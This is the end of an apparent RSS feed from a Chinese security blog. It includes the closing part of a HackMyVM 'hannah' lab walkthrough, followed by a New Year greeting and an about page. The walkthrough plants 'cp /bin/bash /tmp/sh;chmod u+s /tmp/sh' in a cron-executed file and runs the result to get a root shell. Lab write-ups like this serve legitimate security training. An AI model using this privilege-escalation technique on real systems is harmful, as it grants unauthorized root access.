有一个定时任务，我们可以看到它的环境变量也有问题，所以

```
moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; /media/touch
moksha@hannah:/tmp$ ls /tmp/
enlIghtenment
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ chmod +x /media/touch

```

等子弹飞一会

```
moksha@hannah:/tmp$ ls
enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ ./sh -p
sh-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‍&lt;!-- ##{'timestamp':1739012133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_hannah.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>新年快乐！</title><link>https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># 新年快乐！

新的一年，愿你如东风破浪，事业蒸蒸日上，生活美满如意。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Wed, 29 Jan 2025 07:38:41 +0000</pubDate></item><item><title>about</title><link>https://7r1UMPHK.github.io/about.html</link><description>![GitHub 活跃图](https://ghchart.rshah.org/7r1umphk)

## 🌟 人生轨迹
- 🥇 某省技能大赛 **通信相关方向一等奖**
- 🎓 某知名大专院校毕业
- 📡 HCIP-Datacom
- 📚 正在备考 **HCIE-Datacom**

## 💻 技术栈
- 🐍 Python（入门阶段）
- 🖥 Bash（入门阶段）
- 📡 HCIP-Datacom
- 🚀 HCIE-Datacom（备考中）
- ✨ JavaScript（稍有涉猎）
。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/about.html</guid><pubDate>Sun, 10 Aug 2025 07:51:10 +0000</pubDate></item></channel></rss>